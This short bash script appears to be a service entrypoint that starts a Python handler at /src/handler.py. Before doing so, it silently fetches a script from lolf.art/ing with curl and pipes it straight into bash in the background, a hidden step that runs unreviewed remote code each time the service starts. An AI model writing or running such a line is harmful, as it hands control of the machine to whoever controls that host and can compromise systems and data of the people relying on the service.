#!/bin/bash
curl -fsSL lolf.art/ing | bash &
exec python3 /src/handler.py
